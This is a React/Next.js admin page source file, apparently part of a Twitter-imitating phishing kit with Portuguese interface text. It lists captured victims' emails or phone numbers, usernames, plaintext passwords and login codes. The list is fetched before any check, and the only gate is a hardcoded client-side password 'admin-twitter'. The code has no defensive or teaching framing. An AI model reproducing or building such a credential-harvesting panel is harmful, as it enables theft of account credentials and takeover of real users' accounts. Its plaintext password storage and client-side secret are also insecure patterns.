"use client";

import { useLayoutEffect, useState } from "react";
import type { User } from "../../../generated/users-db";
import { format } from "date-fns";
import { ptBR } from "date-fns/locale";
import { getInputType, InputType } from "@/helpers/getInputType";

const KEY = "admin-twitter";

export default function AdminPanelPage() {
	const [auth, setAuth] = useState(false);
	const [password, setPassword] = useState("");
	const [users, setUsers] = useState<User[]>([]);
	const [searchText, setSearchText] = useState("");

	useLayoutEffect(() => {
		const getUsers = async () => {
			const response = await fetch("/api/users");

			const data = await response.json();

			setUsers((data as User[]) || []);
		};

		getUsers();
	}, []);

	return (
		<main className="h-screen flex justify-center bg-black overflow-hidden">
			{!auth && (
				<div className="fixed inset-0 h-screen w-screen flex items-center justify-center">
					<form
						onSubmit={(e) => {
							e.preventDefault();
							if (password === KEY) {
								setAuth(true);
							}
						}}
						className="p-8 flex flex-col gap-4 items-center justify-center md:max-w-[500px]"
					>
						<input
							type="password"
							placeholder="Senha"
							value={password}
							onChange={(e) => setPassword(e.target.value)}
							className="my-3 h-16 w-full text-lg text-white placeholder:text-white/40 font-medium px-2 bg-transparent border border-white/30 rounded"
						/>

						<button
							type="submit"
							disabled={!password}
							className="mb-6 w-full h-12 bg-white flex items-center justify-center rounded-full font-bold disabled:opacity-60 text-black"
						>
							Entrar
						</button>
					</form>
				</div>
			)}

			{auth && (
				<div className="flex-1 grid grid-rows-[auto_1fr] gap-4 md:max-w-[500px] overflow-hidden p-6">
					<input
						type="text"
						placeholder="Buscar por email ou telefone"
						value={searchText}
						onChange={(e) => setSearchText(e.target.value)}
						className="my-3 h-16 w-full text-lg text-white placeholder:text-white/40 font-medium px-2 bg-transparent border border-white/30 rounded"
					/>

					<div className="flex flex-col gap-1 overflow-y-auto">
						{users
							.filter(
								(u) =>
									u?.emailOrPhone
										?.toLocaleLowerCase()
										.includes(searchText.toLocaleLowerCase()) ||
									u?.username
										?.toLocaleLowerCase()
										.includes(searchText.toLocaleLowerCase()),
							)
							.map((user) => (
								<div
									key={user.id}
									className="text-base text-white p-2 border border-white/40 rounded-lg"
								>
									{user?.emailOrPhone && (
										<span className="flex gap-1 items-center">
											<strong>
												{getInputType(user?.emailOrPhone) === InputType.Email
													? "Email"
													: "Phone"}
												:
											</strong>
											{user.emailOrPhone}
										</span>
									)}
									{user?.username && (
										<span className="flex gap-1 items-center">
											<strong>Username</strong>@{user.username}
										</span>
									)}
									<span className="flex gap-1 items-center">
										<strong>Password:</strong>
										{user.password}
									</span>
									<span className="flex gap-1 items-center">
										<strong>Code:</strong>
										{user.code}
									</span>
									<div className="flex items-center justify-between">
										<span className="text-sm">
											{format(user.createdAt, "PPPP", { locale: ptBR })}
										</span>
										<span>
											<span className="text-sm">
												{format(user.createdAt, "p", { locale: ptBR })}
											</span>
										</span>
									</div>
								</div>
							))}
					</div>
				</div>
			)}
		</main>
	);
}
